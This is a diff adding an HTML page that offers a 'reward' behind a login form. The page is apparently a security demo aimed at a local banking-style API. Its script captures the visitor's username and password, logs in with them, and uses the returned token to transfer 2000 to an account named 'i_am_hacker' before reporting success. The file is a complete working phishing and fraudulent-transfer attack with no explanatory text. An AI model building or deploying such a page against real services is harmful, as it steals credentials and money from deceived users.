@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Welcome</title>
+</head>
+<body>
+  <h1>CLAIM YOUR REWARD!</h1>
+  <p>Please login before claiming your reward</p>
+
+  <form id="form">
+    <div>
+      <label for="username">Username</label>
+      <input type="text" name="username" id="username" placeholder="Username" />
+    </div>
+    <div>
+      <label for="password">Password</label>
+      <input type="password" name="password" id="password" placeholder="Password" />
+    </div>
+    <div>
+      <button type="submit">Login</button>
+    </div>
+  </form>
+
+  <script>
+    const form = document.getElementById('form')
+    form.addEventListener('submit', async (event) => {
+      event.preventDefault()
+      const username = document.getElementById('username').value
+      const password = document.getElementById('password').value
+      const auth = await fetch('http://localhost:3000/api/login', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ username, password })
+      }).then(res => res.json())
+      const token = auth.data.token
+      await fetch('http://localhost:3000/api/transfer', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': `Bearer ${token}`
+        },
+        body: JSON.stringify({ username: 'i_am_hacker', amount: 2000 })
+      })
+      alert('SUCCESS!')
+    })
+  </script>
+</body>
+</html>
